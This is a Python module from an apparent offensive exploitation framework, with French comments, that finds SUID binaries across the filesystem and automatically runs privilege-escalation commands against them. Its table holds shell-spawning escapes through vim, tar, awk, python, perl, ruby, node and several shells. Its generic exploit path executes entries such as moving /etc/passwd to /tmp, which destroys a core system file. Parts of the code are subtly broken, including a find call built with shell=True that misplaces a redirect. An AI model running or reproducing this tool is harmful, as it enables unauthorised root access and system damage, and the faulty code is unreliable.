#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'exploitation des binaires SUID
Détecte et exploite les binaires SUID vulnérables
"""

import os
import stat
import subprocess
import pwd
from pathlib import Path

from exploits import BaseModule
from utils.system import run_command, get_file_permissions
from utils.logger import get_logger

logger = get_logger(__name__)

class Module(BaseModule):
    """Module d'exploitation des binaires SUID"""
    
    # Métadonnées
    description = "Détecte les binaires SUID exploitables"
    author = "huoshi"
    risk_level = "High"
    targets = ["Linux", "Unix"]
    
    # Options configurables
    options = {
        'SEARCH_PATHS': 'Chemins de recherche des binaires SUID',
        'PAYLOAD_CMD': 'Commande à exécuter après exploitation'
    }
    
    def __init__(self):
        super().__init__()
        
        # Binaires SUID connus comme exploitables
        self.exploitable_binaries = {
            'find': {
                'description': 'find avec SUID peut exécuter des commandes',
                'exploit_cmd': 'find /etc/passwd -exec whoami \\;',
                'risk': 'High'
            },
            'vim': {
                'description': 'vim avec SUID permet l\'élévation de privilèges',
                'exploit_cmd': 'vim -c ":py import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'reset; exec sh\')"',
                'risk': 'Critical'
            },
            'nano': {
                'description': 'nano avec SUID peut lire/écrire des fichiers privilégiés',
                'exploit_cmd': 'nano /etc/passwd',
                'risk': 'High'
            },
            'cp': {
                'description': 'cp avec SUID peut copier des fichiers système',
                'exploit_cmd': 'cp /etc/passwd /tmp/passwd_backup',
                'risk': 'High'
            },
            'mv': {
                'description': 'mv avec SUID peut déplacer des fichiers système',
                'exploit_cmd': 'mv /etc/passwd /tmp/passwd_moved',
                'risk': 'Critical'
            },
            'tar': {
                'description': 'tar avec SUID peut extraire des archives avec privilèges',
                'exploit_cmd': 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
                'risk': 'Critical'
            },
            'less': {
                'description': 'less avec SUID peut exécuter des commandes',
                'exploit_cmd': 'less /etc/profile',
                'risk': 'High'
            },
            'more': {
                'description': 'more avec SUID peut exécuter des commandes',
                'exploit_cmd': 'more /etc/profile',
                'risk': 'High'
            },
            'awk': {
                'description': 'awk avec SUID peut exécuter des commandes système',
                'exploit_cmd': 'awk \'BEGIN {system("/bin/sh")}\'',
                'risk': 'Critical'
            },
            'python': {
                'description': 'python avec SUID permet l\'exécution de code arbitraire',
                'exploit_cmd': 'python -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"',
                'risk': 'Critical'
            },
            'python2': {
                'description': 'python2 avec SUID permet l\'exécution de code arbitraire',
                'exploit_cmd': 'python2 -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"',
                'risk': 'Critical'
            },
            'python3': {
                'description': 'python3 avec SUID permet l\'exécution de code arbitraire',
                'exploit_cmd': 'python3 -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"',
                'risk': 'Critical'
            },
            'ruby': {
                'description': 'ruby avec SUID peut exécuter du code arbitraire',
                'exploit_cmd': 'ruby -e \'exec "/bin/sh"\'',
                'risk': 'Critical'
            },
            'perl': {
                'description': 'perl avec SUID peut exécuter du code arbitraire',
                'exploit_cmd': 'perl -e \'exec "/bin/sh";\'',
                'risk': 'Critical'
            },
            'node': {
                'description': 'node.js avec SUID peut exécuter du code arbitraire',
                'exploit_cmd': 'node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})\'',
                'risk': 'Critical'
            },
            'bash': {
                'description': 'bash avec SUID peut donner un shell privilégié',
                'exploit_cmd': 'bash -p',
                'risk': 'Critical'
            },
            'sh': {
                'description': 'sh avec SUID peut donner un shell privilégié',
                'exploit_cmd': 'sh -p',
                'risk': 'Critical'
            },
            'dash': {
                'description': 'dash avec SUID peut donner un shell privilégié',
                'exploit_cmd': 'dash -p',
                'risk': 'Critical'
            },
            'zsh': {
                'description': 'zsh avec SUID peut donner un shell privilégié',
                'exploit_cmd': 'zsh',
                'risk': 'Critical'
            }
        }
        
        # Chemins de recherche par défaut
        self.search_paths = ['/'
        ]
    
    def scan(self):
        """
        Scanne les binaires SUID vulnérables
        
        Returns:
            list: Liste des vulnérabilités trouvées
        """
        logger.info("Démarrage du scan SUID")
        vulnerabilities = []
        
        # Recherche de tous les binaires SUID
        suid_binaries = self._find_suid_binaries()
        
        # Analyse de chaque binaire trouvé
        for binary_path in suid_binaries:
            binary_name = os.path.basename(binary_path)
            
            # Vérification si le binaire est dans notre liste d'exploitables
            if binary_name in self.exploitable_binaries:
                exploit_info = self.exploitable_binaries[binary_name]
                
                vulnerabilities.append({
                    'type': 'exploitable_suid',
                    'path': binary_path,
                    'binary_name': binary_name,
                    'description': f'Binaire SUID exploitable: {binary_path}',
                    'risk': exploit_info['risk'],
                    'details': exploit_info['description'],
                    'exploit_cmd': exploit_info['exploit_cmd'],
                    'owner': self._get_file_owner(binary_path)
                })
            else:
                # Binaire SUID non répertorié (potentiellement intéressant)
                vulnerabilities.append({
                    'type': 'unknown_suid',
                    'path': binary_path,
                    'binary_name': binary_name,
                    'description': f'Binaire SUID non standard: {binary_path}',
                    'risk': 'Medium',
                    'details': 'Binaire SUID non répertorié, analyse manuelle recommandée',
                    'owner': self._get_file_owner(binary_path)
                })
        
        self.results = vulnerabilities
        logger.info(f"Scan SUID terminé: {len(vulnerabilities)} vulnérabilités trouvées")
        
        return vulnerabilities
    
    def _find_suid_binaries(self):
        """Trouve tous les binaires SUID sur le système"""
        suid_binaries = []
        
        # Utilisation de find pour rechercher les binaires SUID
        try:
            cmd = ['find'] + self.search_paths + ['-type', 'f', '-perm', '-4000', '2>/dev/null']
            result = run_command(cmd, shell=True)
            
            if result['success']:
                for line in result['output'].split('\n'):
                    if line.strip():
                        suid_binaries.append(line.strip())
            
        except Exception as e:
            logger.error(f"Erreur lors de la recherche find: {e}")
        
        # Recherche alternative manuelle si find échoue
        if not suid_binaries:
            suid_binaries = self._manual_suid_search()
        
        return suid_binaries
    
    def _manual_suid_search(self):
        """Recherche manuelle des binaires SUID"""
        suid_binaries = []
        
        for search_path in self.search_paths:
            if not os.path.exists(search_path):
                continue
                
            try:
                for root, dirs, files in os.walk(search_path):
                    # Limitation de la profondeur pour éviter les recherches trop longues
                    if root.count(os.sep) - search_path.count(os.sep) > 3:
                        continue
                    
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        try:
                            file_stat = os.stat(file_path)
                            
                            # Vérification du bit SUID (4000)
                            if file_stat.st_mode & stat.S_ISUID:
                                suid_binaries.append(file_path)
                                
                        except (OSError, PermissionError):
                            continue
                            
            except (OSError, PermissionError):
                logger.debug(f"Permission refusée pour {search_path}")
                continue
        
        return suid_binaries
    
    def _get_file_owner(self, file_path):
        """Retourne le propriétaire d'un fichier"""
        try:
            file_stat = os.stat(file_path)
            owner_uid = file_stat.st_uid
            
            # Conversion UID -> nom d'utilisateur
            try:
                owner_name = pwd.getpwuid(owner_uid).pw_name
                return f"{owner_name} (UID: {owner_uid})"
            except KeyError:
                return f"UID: {owner_uid}"
                
        except OSError:
            return "Unknown"
    
    def exploit_all(self):
        """
        Exploite tous les binaires SUID vulnérables trouvés
        
        Returns:
            list: Résultats des exploitations
        """
        if not self.results:
            return []
        
        exploit_results = []
        
        for vulnerability in self.results:
            if vulnerability['type'] == 'exploitable_suid':
                try:
                    result = self.exploit_single(vulnerability)
                    exploit_results.append(result)
                except Exception as e:
                    exploit_results.append({
                        'success': False,
                        'vulnerability': vulnerability,
                        'error': str(e),
                        'description': f'Erreur exploitation {vulnerability["path"]}'
                    })
        
        return exploit_results
    
    def exploit_single(self, vulnerability):
        """
        Exploite un binaire SUID spécifique
        
        Args:
            vulnerability (dict): Vulnérabilité à exploiter
            
        Returns:
            dict: Résultat de l'exploitation
        """
        if vulnerability['type'] != 'exploitable_suid':
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': 'Type de vulnérabilité non exploitable automatiquement',
                'description': 'Seuls les binaires SUID connus peuvent être exploités automatiquement'
            }
        
        binary_path = vulnerability['path']
        binary_name = vulnerability['binary_name']
        exploit_cmd = vulnerability['exploit_cmd']
        
        try:
            # Test de l'exploitation
            if binary_name in ['bash', 'sh', 'dash', 'zsh']:
                result = self._exploit_shell(binary_path, exploit_cmd)
            elif binary_name in ['python', 'python2', 'python3']:
                result = self._exploit_python(binary_path, exploit_cmd)
            elif binary_name == 'find':
                result = self._exploit_find(binary_path)
            elif binary_name in ['vim', 'nano']:
                result = self._exploit_editor(binary_path, binary_name)
            elif binary_name == 'tar':
                result = self._exploit_tar(binary_path)
            else:
                # Exploitation générique
                result = self._exploit_generic(binary_path, exploit_cmd)
            
            return result
            
        except Exception as e:
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': str(e),
                'description': f'Erreur lors de l\'exploitation de {binary_path}'
            }
    
    def _exploit_shell(self, binary_path, exploit_cmd):
        """Exploite un shell SUID"""
        try:
            # Test avec whoami pour vérifier l'élévation
            test_cmd = f'{binary_path} -p -c "whoami"'
            result = run_command(test_cmd, shell=True)
            
            if result['success']:
                current_user = result['output'].strip()
                
                return {
                    'success': True,
                    'description': f'Shell SUID exploité: {binary_path}',
                    'output': f'Exécution en tant que: {current_user}',
                    'exploit_cmd': exploit_cmd,
                    'details': f'Le shell {binary_path} peut être utilisé pour l\'élévation de privilèges'
                }
            else:
                return {
                    'success': False,
                    'description': f'Échec exploitation shell: {binary_path}',
                    'error': result.get('error', 'Commande échouée')
                }
                
        except Exception as e:
            return {
                'success': False,
                'description': f'Erreur exploitation shell: {binary_path}',
                'error': str(e)
            }
    
    def _exploit_python(self, binary_path, exploit_cmd):
        """Exploite Python SUID"""
        try:
            # Test avec whoami
            test_cmd = f'{binary_path} -c "import os; print(os.getuid())"'
            result = run_command(test_cmd, shell=True)
            
            if result['success']:
                uid = result['output'].strip()
                
                return {
                    'success': True,
                    'description': f'Python SUID exploité: {binary_path}',
                    'output': f'UID effectif: {uid}',
                    'exploit_cmd': exploit_cmd,
                    'details': f'Python peut exécuter du code avec UID {uid}'
                }
            else:
                return {
                    'success': False,
                    'description': f'Échec exploitation Python: {binary_path}',
                    'error': result.get('error', 'Commande échouée')
                }
                
        except Exception as e:
            return {
                'success': False,
                'description': f'Erreur exploitation Python: {binary_path}',
                'error': str(e)
            }
    
    def _exploit_find(self, binary_path):
        """Exploite find SUID"""
        try:
            # Test avec whoami via find
            test_cmd = f'{binary_path} /etc/passwd -exec whoami \\;'
            result = run_command(test_cmd, shell=True)
            
            if result['success']:
                user = result['output'].strip()
                
                return {
                    'success': True,
                    'description': f'find SUID exploité: {binary_path}',
                    'output': f'Commandes exécutées en tant que: {user}',
                    'exploit_cmd': test_cmd,
                    'details': 'find peut exécuter des commandes arbitraires avec -exec'
                }
            else:
                return {
                    'success': False,
                    'description': f'Échec exploitation find: {binary_path}',
                    'error': result.get('error', 'Commande échouée')
                }
                
        except Exception as e:
            return {
                'success': False,
                'description': f'Erreur exploitation find: {binary_path}',
                'error': str(e)
            }
    
    def _exploit_editor(self, binary_path, binary_name):
        """Exploite un éditeur SUID (vim/nano)"""
        try:
            if binary_name == 'vim':
                # Test de vim en mode non-interactif
                test_cmd = f'{binary_path} -c ":!whoami" -c ":q!" /dev/null'
                result = run_command(test_cmd, shell=True)
                
                if result['success']:
                    return {
                        'success': True,
                        'description': f'vim SUID exploité: {binary_path}',
                        'output': f'Peut exécuter des commandes système',
                        'exploit_cmd': f'{binary_path} -c ":!sh"',
                        'details': 'vim peut exécuter des commandes via :!'
                    }
                
            elif binary_name == 'nano':
                # nano peut lire/écrire des fichiers privilégiés
                return {
                    'success': True,
                    'description': f'nano SUID détecté: {binary_path}',
                    'output': 'Peut éditer des fichiers privilégiés',
                    'exploit_cmd': f'{binary_path} /etc/passwd',
                    'details': 'nano peut éditer des fichiers système sensibles'
                }
            
            return {
                'success': False,
                'description': f'Échec exploitation éditeur: {binary_path}',
                'error': 'Méthode d\'exploitation non disponible'
            }
            
        except Exception as e:
            return {
                'success': False,
                'description': f'Erreur exploitation éditeur: {binary_path}',
                'error': str(e)
            }
    
    def _exploit_tar(self, binary_path):
        """Exploite tar SUID"""
        try:
            # Test avec tar et checkpoint
            test_cmd = f'{binary_path} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=whoami'
            result = run_command(test_cmd, shell=True)
            
            if result['success'] and 'root' in result['output']:
                return {
                    'success': True,
                    'description': f'tar SUID exploité: {binary_path}',
                    'output': f'Exécution en tant que root confirmée',
                    'exploit_cmd': f'{binary_path} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=sh',
                    'details': 'tar peut exécuter des commandes via --checkpoint-action'
                }
            else:
                return {
                    'success': False,
                    'description': f'Échec exploitation tar: {binary_path}',
                    'error': 'Checkpoint action non disponible ou échec'
                }
                
        except Exception as e:
            return {
                'success': False,
                'description': f'Erreur exploitation tar: {binary_path}',
                'error': str(e)
            }
    
    def _exploit_generic(self, binary_path, exploit_cmd):
        """Exploitation générique d'un binaire SUID"""
        try:
            # Tentative d'exécution de la commande d'exploitation
            result = run_command(exploit_cmd, shell=True)
            
            return {
                'success': result['success'],
                'description': f'Tentative exploitation: {binary_path}',
                'output': result.get('output', ''),
                'exploit_cmd': exploit_cmd,
                'details': 'Exploitation générique tentée',
                'error': result.get('error') if not result['success'] else None
            }
            
        except Exception as e:
            return {
                'success': False,
                'description': f'Erreur exploitation générique: {binary_path}',
                'error': str(e)
            }